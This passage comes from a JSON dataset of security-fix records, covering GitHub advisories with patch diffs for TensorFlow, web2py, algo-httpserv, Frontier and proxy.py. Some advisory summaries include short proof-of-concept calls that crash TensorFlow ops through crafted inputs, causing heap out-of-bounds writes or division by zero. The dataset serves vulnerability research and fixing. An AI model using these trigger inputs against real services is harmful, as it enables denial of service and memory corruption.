but got \", g.group().size(), \" and \",\\n+                      output_strides.size()));\\n       const int64_t idx = CoordinatesToFlatIndex(g.group(), output_strides);\\n+      OP_REQUIRES(ctx,\\n+                  idx >= 0 && idx < out_flat.size(),\\n+                  errors::Internal(\\n+                      \"Obtained a write index of \", idx,\\n+                      \" which is outside of bounds of [0, \",\\n+                      out_flat.size(), \")\"));\\n       out_flat(idx) = reduced_val();\\n       VLOG(2) << \"coords: \" << absl::StrJoin(g.group(), \",\")\\n               << \"; idx: \" << idx << \"; group \" << Op::Name() << \": \"'}}","message_norm":"prevent heap oob in sparse reduction ops.\n\npiperorigin-revid: 387934524\nchange-id: i894aa30f1e454f09b471d565b4a325da49322c1a","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('387934524', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_reduce_op.cc'])","num_files":1.0},{"index":1553,"vuln_id":"GHSA-cgjv-rghq-qhgp","cwe_id":"{'CWE-22'}","score":8.6,"chain":"{'https:\/\/github.com\/AlgoRythm-Dylan\/httpserv\/commit\/bcfe9d4316c2b59aab3a64a38905376026888735'}","dataset":"osv","summary":"Path Traversal in algo-httpserv Versions of `algo-httpserv` prior to 1.1.2 are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths. \n\n\n## Recommendation\n\nUpgrade to version 1.1.2 or later.","published_date":"2019-09-11","chain_len":1,"project":"https:\/\/github.com\/AlgoRythm-Dylan\/httpserv","commit_href":"https:\/\/github.com\/AlgoRythm-Dylan\/httpserv\/commit\/bcfe9d4316c2b59aab3a64a38905376026888735","commit_sha":"bcfe9d4316c2b59aab3a64a38905376026888735","patch":"SINGLE","chain_ord":"['bcfe9d4316c2b59aab3a64a38905376026888735']","before_first_fix_commit":"{'7763b4f9b0b9e1873ae0cdfef582c786ee96f091'}","last_fix_commit":"bcfe9d4316c2b59aab3a64a38905376026888735","chain_ord_pos":1.0,"commit_datetime":"05\/17\/2019, 22:10:35","message":"Fixed path vulnerability","author":"AlgoRythm-Dylan","comments":null,"stats":"{'additions': 7, 'deletions': 2, 'total': 9}","files":"{'httpserv.js': {'additions': 7, 'deletions': 2, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/AlgoRythm-Dylan\/httpserv\/raw\/bcfe9d4316c2b59aab3a64a38905376026888735\/httpserv.js', 'patch': '@@ -1,6 +1,7 @@\\n \/\/ Stream-based KISS HTTP(S) server\\n \\n const url = require(\"url\");\\n+const pathlib = require(\"path\")\\n const fs = require(\"fs\");\\n \\n \/\/ A small database of MIME associations\\n@@ -32,7 +33,7 @@ var MIMES = {\\n     \".zip\": \"application\/zip\"\\n }\\n \\n-var servePath = \"serve\";\\n+var servePath = \"serve\/\";\\n function doStream(request, response, filePath, stats, MIME){\\n     let responseOptions = {};\\n     let streamOptions = {};\\n@@ -82,7 +83,11 @@ module.exports.serve = function(request, response){\\n         MIME = MIMES[fileType];\\n     }\\n     \/\/ Serve the actual file\\n-    var filePath = servePath + path;\\n+    var filePath = pathlib.join(servePath, path);\\n+    if(filePath.indexOf(servePath) !== 0){\\n+        response.end();\\n+        return;\\n+    }\\n     let handler = handlers[path];\\n     if(handler !== undefined){\\n         if(handler.requestTypes === null || handler.requestTypes.indexOf(request.method) != -1){'}}","message_norm":"fixed path vulnerability","language":"en","entities":"[('fixed', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['httpserv.js'])","num_files":1.0},{"index":1554,"vuln_id":"GHSA-cgrj-xjm7-9q27","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/web2py\/web2py\/commit\/a181b855a43cb8b479d276b082cfcde385768451'}","dataset":"osv","summary":"Open redirect in web2py Open redirect vulnerability in web2py versions prior to 2.22.5 allows a remote attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having a user to access a specially crafted URL.","published_date":"2022-06-28","chain_len":1,"project":"https:\/\/github.com\/web2py\/web2py","commit_href":"https:\/\/github.com\/web2py\/web2py\/commit\/a181b855a43cb8b479d276b082cfcde385768451","commit_sha":"a181b855a43cb8b479d276b082cfcde385768451","patch":"SINGLE","chain_ord":"['a181b855a43cb8b479d276b082cfcde385768451']","before_first_fix_commit":"{'842994def40ca565aa954a13aa065d2da1090948'}","last_fix_commit":"a181b855a43cb8b479d276b082cfcde385768451","chain_ord_pos":1.0,"commit_datetime":"06\/04\/2022, 17:57:08","message":"added validation of send attribute in admin","author":"Massimo Di Pierro","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'applications\/admin\/controllers\/default.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/web2py\/web2py\/raw\/a181b855a43cb8b479d276b082cfcde385768451\/applications%2Fadmin%2Fcontrollers%2Fdefault.py', 'patch': '@@ -12,7 +12,7 @@\\n from gluon.admin import *\\n from gluon.fileutils import abspath, read_file, write_file\\n from gluon.utils import web2py_uuid\\n-from gluon.tools import Config\\n+from gluon.tools import Config, prevent_open_redirect\\n from gluon.compileapp import find_exposed_functions\\n from glob import glob\\n from gluon._compat import iteritems, PY2, pickle, xrange, urlopen, to_bytes, StringIO, to_native, reload\\n@@ -118,7 +118,7 @@ def get_app(name=None):\\n def index():\\n     \"\"\" Index handler \"\"\"\\n \\n-    send = request.vars.send\\n+    send = prevent_open_redirect(request.vars.send)\\n     if DEMO_MODE:\\n         session.authorized = True\\n         session.last_time = t0'}}","message_norm":"added validation of send attribute in admin","language":"en","entities":"[('added', 'ACTION', ''), ('admin', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['applications\/admin\/controllers\/default.py'])","num_files":1.0},{"index":1560,"vuln_id":"GHSA-cjc7-49v2-jp64","cwe_id":"{'CWE-787', 'CWE-665'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fd02f44810754ae7481838b6a67c5df7f909ca3', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/41727ff06111117bdf86b37db198217fd7a143cc'}","dataset":"osv","summary":"Incomplete validation in `SparseAdd` ### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    thresh=thresh)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches\nWe have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit  [41727ff06111117bdf86b37db198217fd7a143cc](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/41727ff06111117bdf86b37db198217fd7a143cc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fd02f44810754ae7481838b6a67c5df7f909ca3","commit_sha":"6fd02f44810754ae7481838b6a67c5df7f909ca3","patch":"MULTI","chain_ord":"['6fd02f44810754ae7481838b6a67c5df7f909ca3', '41727ff06111117bdf86b37db198217fd7a143cc']","before_first_fix_commit":"{'6f432d6334edc93fd5af0070170def56b0413e8a'}","last_fix_commit":"41727ff06111117bdf86b37db198217fd7a143cc","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2021, 23:40:49","message":"Fix `tf.raw_ops.SparseAdd ` invalid memory access failure.\n\nPiperOrigin-RevId: 370568774\nChange-Id: I5f73b31c865f2948a1c8dfb7ebd22b3cfb6405bf","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/sparse_add_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6fd02f44810754ae7481838b6a67c5df7f909ca3\/tensorflow%2Fcore%2Fkernels%2Fsparse_add_op.cc', 'patch': '@@ -14,6 +14,7 @@ limitations under the License.\\n ==============================================================================*\/\\n \\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_util.h\"\\n@@ -101,6 +102,10 @@ class SparseAddOp : public OpKernel {\\n     std::vector<T> out_values;\\n     const int num_dims = a_shape->dim_size(0);\\n \\n+    OP_REQUIRES(ctx, num_dims > 0,\\n+                errors::InvalidArgument(\"Invalid input_a shape. Received: \",\\n+                                        a_shape->DebugString()));\\n+\\n     \/\/ The input and output sparse tensors are assumed to be ordered along\\n     \/\/ increasing dimension number.\\n     int64 i = 0, j = 0;'}}","message_norm":"fix `tf.raw_ops.sparseadd ` invalid memory access failure.\n\npiperorigin-revid: 370568774\nchange-id: i5f73b31c865f2948a1c8dfb7ebd22b3cfb6405bf","language":"en","entities":"[('fix', 'ACTION', ''), ('invalid memory access', 'SECWORD', ''), ('370568774', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_add_op.cc'])","num_files":1.0},{"index":1561,"vuln_id":"GHSA-cjc7-49v2-jp64","cwe_id":"{'CWE-787', 'CWE-665'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fd02f44810754ae7481838b6a67c5df7f909ca3', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/41727ff06111117bdf86b37db198217fd7a143cc'}","dataset":"osv","summary":"Incomplete validation in `SparseAdd` ### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    thresh=thresh)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches\nWe have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit  [41727ff06111117bdf86b37db198217fd7a143cc](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/41727ff06111117bdf86b37db198217fd7a143cc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/41727ff06111117bdf86b37db198217fd7a143cc","commit_sha":"41727ff06111117bdf86b37db198217fd7a143cc","patch":"MULTI","chain_ord":"['6fd02f44810754ae7481838b6a67c5df7f909ca3', '41727ff06111117bdf86b37db198217fd7a143cc']","before_first_fix_commit":"{'6f432d6334edc93fd5af0070170def56b0413e8a'}","last_fix_commit":"41727ff06111117bdf86b37db198217fd7a143cc","chain_ord_pos":2.0,"commit_datetime":"05\/11\/2021, 22:41:51","message":"Validate that a and b are proper sparse tensors\n\nPiperOrigin-RevId: 373248068\nChange-Id: I0a2041a0747901b3f00387a6a3bce9bca6b0b3b1","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 12, 'deletions': 5, 'total': 17}","files":"{'tensorflow\/core\/kernels\/sparse_add_op.cc': {'additions': 12, 'deletions': 5, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/41727ff06111117bdf86b37db198217fd7a143cc\/tensorflow%2Fcore%2Fkernels%2Fsparse_add_op.cc', 'patch': '@@ -44,6 +44,11 @@ class SparseAddOp : public OpKernel {\\n                     b_indices->shape().DebugString()));\\n     const int64 a_nnz = a_indices->dim_size(0);\\n     const int64 b_nnz = b_indices->dim_size(0);\\n+    const int num_dims = a_indices->dim_size(1);\\n+    OP_REQUIRES(ctx, b_indices->dim_size(1) == num_dims,\\n+                errors::InvalidArgument(\\n+                    \"Input indices must have the same dimension, got \",\\n+                    num_dims, \" and \", b_indices->dim_size(1)));\\n \\n     OP_REQUIRES_OK(ctx, ctx->input(\"a_values\", &a_values_t));\\n     OP_REQUIRES_OK(ctx, ctx->input(\"b_values\", &b_values_t));\\n@@ -72,6 +77,13 @@ class SparseAddOp : public OpKernel {\\n                     \"Input shapes should be a vector but received shapes \",\\n                     a_shape->shape().DebugString(), \" and \",\\n                     b_shape->shape().DebugString()));\\n+    OP_REQUIRES(\\n+        ctx, a_shape->NumElements() == num_dims,\\n+        errors::InvalidArgument(\"Second dimension of a_indices and length of \"\\n+                                \"a_shape must match, got \",\\n+                                num_dims, \" and \", a_shape->NumElements()));\\n+    OP_REQUIRES(ctx, num_dims > 0,\\n+                errors::InvalidArgument(\"Tesors must not be empty\"));\\n     OP_REQUIRES(\\n         ctx, a_shape->IsSameSize(*b_shape),\\n         errors::InvalidArgument(\\n@@ -100,11 +112,6 @@ class SparseAddOp : public OpKernel {\\n     std::vector<std::pair<bool, int64>> entries_to_copy;  \/\/ from_a?, idx\\n     entries_to_copy.reserve(a_nnz + b_nnz);\\n     std::vector<T> out_values;\\n-    const int num_dims = a_shape->dim_size(0);\\n-\\n-    OP_REQUIRES(ctx, num_dims > 0,\\n-                errors::InvalidArgument(\"Invalid input_a shape. Received: \",\\n-                                        a_shape->DebugString()));\\n \\n     \/\/ The input and output sparse tensors are assumed to be ordered along\\n     \/\/ increasing dimension number.'}}","message_norm":"validate that a and b are proper sparse tensors\n\npiperorigin-revid: 373248068\nchange-id: i0a2041a0747901b3f00387a6a3bce9bca6b0b3b1","language":"en","entities":"[('validate', 'ACTION', ''), ('373248068', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_add_op.cc'])","num_files":1.0},{"index":1562,"vuln_id":"GHSA-cjg2-2fjg-fph4","cwe_id":"{'CWE-191'}","score":0.0,"chain":"{'https:\/\/github.com\/paritytech\/frontier\/commit\/8a93fdc6c9f4eb1d2f2a11b7ff1d12d70bf5a664'}","dataset":"osv","summary":"Integer underflow in Frontier ### Impact\n\nA bug in Frontier's MODEXP precompile implementation can cause an integer underflow in certain conditions. This will cause a node crash for debug builds. For release builds (and production WebAssembly binaries), the impact is limited as it can only cause a normal EVM out-of-gas. It is recommended that you apply the patch as soon as possible.\n\nIf you do not use MODEXP precompile in your runtime, then you are not impacted.\n\n### Patches\n\nPatches are applied in PR #549.\n\n### Workarounds\n\nNone.\n\n### References\n\nPatch PR: #549\n\n### Credits\n\nThanks to SR-Labs for discovering the security vulnerability, and thanks to PureStake team for the patches.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in the [Frontier repo](https:\/\/github.com\/paritytech\/frontier)","published_date":"2022-01-14","chain_len":1,"project":"https:\/\/github.com\/paritytech\/frontier","commit_href":"https:\/\/github.com\/paritytech\/frontier\/commit\/8a93fdc6c9f4eb1d2f2a11b7ff1d12d70bf5a664","commit_sha":"8a93fdc6c9f4eb1d2f2a11b7ff1d12d70bf5a664","patch":"SINGLE","chain_ord":"['8a93fdc6c9f4eb1d2f2a11b7ff1d12d70bf5a664']","before_first_fix_commit":"{'6dd07a4d581a4c00bb2a2238a81997fc75bc2127'}","last_fix_commit":"8a93fdc6c9f4eb1d2f2a11b7ff1d12d70bf5a664","chain_ord_pos":1.0,"commit_datetime":"01\/13\/2022, 16:23:07","message":"Handle 0 exponent with fudged length correctly in ModExp (#549)\n\n* Handle 0 exponent with fudged length correctly in ModExp\r\n\r\n* cargo fmt\r\n\r\n* Revert to following EIP-2565 strictly, subtract after adding terms to prevent underflow\r\n\r\n* Update frame\/evm\/precompile\/modexp\/src\/lib.rs\r\n\r\nClean up test case\r\n\r\nCo-authored-by: Wei Tang <accounts@that.world>\r\n\r\n* More revert\r\n\r\n* cargo fmt\r\n\r\n* Prefer expect to match\r\n\r\nCo-authored-by: Wei Tang <accounts@that.world>","author":"Stephen Shelton","comments":null,"stats":"{'additions': 51, 'deletions': 5, 'total': 56}","files":"{'frame\/evm\/precompile\/modexp\/src\/lib.rs': {'additions': 51, 'deletions': 5, 'changes': 56, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/paritytech\/frontier\/raw\/8a93fdc6c9f4eb1d2f2a11b7ff1d12d70bf5a664\/frame%2Fevm%2Fprecompile%2Fmodexp%2Fsrc%2Flib.rs', 'patch': '@@ -47,7 +47,10 @@ fn calculate_gas_cost(\\n \\t\\t\\twords += 1;\\n \\t\\t}\\n \\n-\\t\\t\/\/ TODO: prevent\/handle overflow\\n+\\t\\t\/\/ Note: can\\'t overflow because we take words to be some u64 value \/ 8, which is\\n+\\t\\t\/\/ necessarily less than sqrt(u64::MAX).\\n+\\t\\t\/\/ Additionally, both base_length and mod_length are bounded to 1024, so this has\\n+\\t\\t\/\/ an upper bound of roughly (1024 \/ 8) squared\\n \\t\\twords * words\\n \\t}\\n \\n@@ -63,8 +66,17 @@ fn calculate_gas_cost(\\n \\t\\t\\tlet bytes: [u8; 32] = [0xFF; 32];\\n \\t\\t\\tlet max_256_bit_uint = BigUint::from_bytes_be(&bytes);\\n \\n+\\t\\t\\t\/\/ from the EIP spec:\\n+\\t\\t\\t\/\/ (8 * (exp_length - 32)) + ((exponent & (2**256 - 1)).bit_length() - 1)\\n+\\t\\t\\t\/\/\\n+\\t\\t\\t\/\/ Notes:\\n+\\t\\t\\t\/\/ * exp_length is bounded to 1024 and is > 32\\n+\\t\\t\\t\/\/ * exponent can be zero, so we subtract 1 after adding the other terms (whose sum\\n+\\t\\t\\t\/\/   must be > 0)\\n+\\t\\t\\t\/\/ * the addition can\\'t overflow because the terms are both capped at roughly\\n+\\t\\t\\t\/\/   8 * max size of exp_length (1024)\\n \\t\\t\\titeration_count =\\n-\\t\\t\\t\\t(8 * (exp_length - 32)) + ((exponent.bitand(max_256_bit_uint)).bits() - 1);\\n+\\t\\t\\t\\t(8 * (exp_length - 32)) + exponent.bitand(max_256_bit_uint).bits() - 1;\\n \\t\\t}\\n \\n \\t\\tmax(iteration_count, 1)\\n@@ -89,7 +101,7 @@ fn calculate_gas_cost(\\n \/\/ 6) modulus, size as described above\\n \/\/\\n \/\/\\n-\/\/ NOTE: input sizes are arbitrarily large (up to 256 bits), with the expectation\\n+\/\/ NOTE: input sizes are bound to 1024 bytes, with the expectation\\n \/\/       that gas limits would be applied before actual computation.\\n \/\/\\n \/\/       maximum stack size will also prevent abuse.\\n@@ -133,7 +145,7 @@ impl Precompile for Modexp {\\n \\t\\tlet mod_len_big = BigUint::from_bytes_be(&buf);\\n \\t\\tif mod_len_big > max_size_big {\\n \\t\\t\\treturn Err(PrecompileFailure::Error {\\n-\\t\\t\\t\\texit_status: ExitError::Other(\"unreasonably large exponent length\".into()),\\n+\\t\\t\\t\\texit_status: ExitError::Other(\"unreasonably large modulus length\".into()),\\n \\t\\t\\t});\\n \\t\\t}\\n \\n@@ -162,7 +174,6 @@ impl Precompile for Modexp {\\n \\t\\t\\tlet exponent = BigUint::from_bytes_be(&input[exp_start..exp_start + exp_len]);\\n \\n \\t\\t\\t\/\/ do our gas accounting\\n-\\t\\t\\t\/\/ TODO: we could technically avoid reading base first...\\n \\t\\t\\tlet gas_cost =\\n \\t\\t\\t\\tcalculate_gas_cost(base_len as u64, exp_len as u64, mod_len as u64, &exponent);\\n \\t\\t\\tif let Some(gas_left) = target_gas {\\n@@ -423,4 +434,39 @@ mod tests {\\n \\t\\t\\t}\\n \\t\\t}\\n \\t}\\n+\\n+\\t#[test]\\n+\\tfn test_zero_exp_with_33_length() {\\n+\\t\\t\/\/ This is a regression test which ensures that the \\'iteration_count\\' calculation\\n+\\t\\t\/\/ in \\'calculate_iteration_count\\' cannot underflow.\\n+\\t\\t\/\/\\n+\\t\\t\/\/ In debug mode, this underflow could cause a panic. Otherwise, it causes N**0 to\\n+\\t\\t\/\/ be calculated at more-than-normal expense.\\n+\\t\\t\/\/\\n+\\t\\t\/\/ TODO: cite security advisory\\n+\\n+\\t\\tlet input = vec![\\n+\\t\\t\\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\\n+\\t\\t\\t0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\\n+\\t\\t\\t0, 0, 0, 0, 0, 33, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\\n+\\t\\t\\t0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\\n+\\t\\t\\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1,\\n+\\t\\t];\\n+\\n+\\t\\tlet cost: u64 = 100000;\\n+\\n+\\t\\tlet context: Context = Context {\\n+\\t\\t\\taddress: Default::default(),\\n+\\t\\t\\tcaller: Default::default(),\\n+\\t\\t\\tapparent_value: From::from(0),\\n+\\t\\t};\\n+\\n+\\t\\tlet precompile_result = Modexp::execute(&input, Some(cost), &context, false)\\n+\\t\\t\\t.expect(\"Modexp::execute() returned error\");\\n+\\n+\\t\\tassert_eq!(precompile_result.output.len(), 1); \/\/ should be same length as mod\\n+\\t\\tlet result = BigUint::from_bytes_be(&precompile_result.output[..]);\\n+\\t\\tlet expected = BigUint::parse_bytes(b\"0\", 10).unwrap();\\n+\\t\\tassert_eq!(result, expected);\\n+\\t}\\n }'}}","message_norm":"handle 0 exponent with fudged length correctly in modexp (#549)\n\n* handle 0 exponent with fudged length correctly in modexp\r\n\r\n* cargo fmt\r\n\r\n* revert to following eip-2565 strictly, subtract after adding terms to prevent underflow\r\n\r\n* update frame\/evm\/precompile\/modexp\/src\/lib.rs\r\n\r\nclean up test case\r\n\r\nco-authored-by: wei tang <accounts@that.world>\r\n\r\n* more revert\r\n\r\n* cargo fmt\r\n\r\n* prefer expect to match\r\n\r\nco-authored-by: wei tang <accounts@that.world>","language":"en","entities":"[('#549', 'ISSUE', ''), ('adding', 'ACTION', ''), ('prevent', 'ACTION', ''), ('underflow', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['frame\/evm\/precompile\/modexp\/src\/lib.rs'])","num_files":1.0},{"index":1567,"vuln_id":"GHSA-cm5x-837x-jf3c","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e86605c0a336c088b638da02135ea6f9f6753618'}","dataset":"osv","summary":"Division by 0 in inplace operations ### Impact\nAn attacker can cause a floating point exception by calling inplace operations with crafted arguments that would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.InplaceSub(x=[],i=[-99,-1,-1],v=[1,1,1])\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/inplace_ops.cc#L283) has a logic error: it should skip processing if `x` and `v` are empty but the code uses `||` instead of `&&`.\n\n### Patches\nWe have patched the issue in GitHub commit [e86605c0a336c088b638da02135ea6f9f6753618](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e86605c0a336c088b638da02135ea6f9f6753618).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e86605c0a336c088b638da02135ea6f9f6753618","commit_sha":"e86605c0a336c088b638da02135ea6f9f6753618","patch":"SINGLE","chain_ord":"['e86605c0a336c088b638da02135ea6f9f6753618']","before_first_fix_commit":"{'29e3d6b706a33780b1cb4863200ec7525ff035ce'}","last_fix_commit":"e86605c0a336c088b638da02135ea6f9f6753618","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 21:21:27","message":"Fix FPE in inpace update ops.\n\nPiperOrigin-RevId: 388303197\nChange-Id: Ib48309b6213ffe53eba81004b00e889d653e4b83","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/core\/kernels\/inplace_ops.cc': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e86605c0a336c088b638da02135ea6f9f6753618\/tensorflow%2Fcore%2Fkernels%2Finplace_ops.cc', 'patch': '@@ -225,7 +225,7 @@ class InplaceOpBase : public OpKernel {\\n \\n     Tensor y = x;  \/\/ This creates an alias intentionally.\\n     \/\/ Skip processing if tensors are empty.\\n-    if (x.NumElements() > 0 || v.NumElements() > 0) {\\n+    if (x.NumElements() > 0 && v.NumElements() > 0) {\\n       OP_REQUIRES_OK(ctx, DoCompute(ctx, i, v, &y));\\n     }\\n     ctx->set_output(0, y);'}}","message_norm":"fix fpe in inpace update ops.\n\npiperorigin-revid: 388303197\nchange-id: ib48309b6213ffe53eba81004b00e889d653e4b83","language":"en","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('388303197', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/inplace_ops.cc'])","num_files":1.0},{"index":1570,"vuln_id":"GHSA-cmc7-mfmr-xqrx","cwe_id":"{'CWE-480', 'CWE-287'}","score":7.5,"chain":"{'https:\/\/github.com\/abhinavsingh\/proxy.py\/pull\/482\/commits\/9b00093288237f5073c403f2c4f62acfdfa8ed46'}","dataset":"osv","summary":"Logic error in authentication in proxy.py before_upstream_connection in AuthPlugin in http\/proxy\/auth.py in proxy.py before 2.3.1 accepts incorrect Proxy-Authorization header data because of a boolean confusion (and versus 